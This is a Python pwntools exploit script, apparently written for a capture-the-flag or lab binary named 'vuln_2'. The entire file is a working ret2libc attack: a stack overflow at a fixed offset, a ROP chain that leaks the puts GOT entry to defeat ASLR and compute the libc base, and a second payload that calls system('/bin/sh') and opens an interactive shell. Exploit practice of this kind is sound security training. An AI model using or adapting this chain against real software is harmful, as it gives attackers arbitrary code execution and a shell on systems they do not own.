#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]


p = process("./vuln_2")
e = ELF("./vuln_2")

# gdb.attach(p, api=True)

overflow_offset_to_rip = 264

rop = ROP(e)
pop_rdi_ret_offset = rop.find_gadget(["pop rdi", "ret"]).address
info(f"Found `pop rdi; ret; = {hex(pop_rdi_ret_offset)}")

puts_plt_offset = e.plt["puts"]
puts_got_offset = e.got["puts"]

info(f"Found puts in plt = {hex(puts_plt_offset)}")
info(f"Found puts in got = {hex(puts_got_offset)}")

main_offset = e.symbols["main"]
info(f"Found main = {hex(main_offset)}")


# -- LEAK #1 - LIBC ADDR (defeat ALSR) and `puts` PLT to print `puts` GOT entry

# Send ROP chain in payload to leak libc and return back into main()
payload = (
    b"A" * (overflow_offset_to_rip)
    + p64(pop_rdi_ret_offset)
    + p64(puts_got_offset)
    + p64(puts_plt_offset)
    + p64(main_offset)
)

p.sendafter(b"Hey, whats your name!?\n\n", payload)
p.recvline()
p.recvline()

leak_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
info(f"leaked puts@GOT = {hex(leak_puts)}")

# Calc libc base
libc_base = leak_puts - e.libc.symbols["puts"]
info(f"libc_base = {hex(libc_base)}")

libc_system = libc_base + e.libc.symbols["system"]
info(f"libc_system = {hex(libc_system)}")

libc_bin_sh = libc_base + next(e.libc.search(b"/bin/sh"))
info(f"libc_bin_sh = {hex(libc_bin_sh)}")

pause()


# -- FINAL RUN - call system!

ret = rop.find_gadget(["ret"]).address

# construct payload
payload = b"A" * overflow_offset_to_rip
payload += p64(pop_rdi_ret_offset)
payload += p64(libc_bin_sh)
# align the stack to 16-bytes so `movaps` instruction in `system()` doesn't crash
payload += p64(ret)
payload += p64(libc_system)

# send final payload
p.sendafter(b"Hey, whats your name!?\n\n", payload)
# pause()

p.interactive()
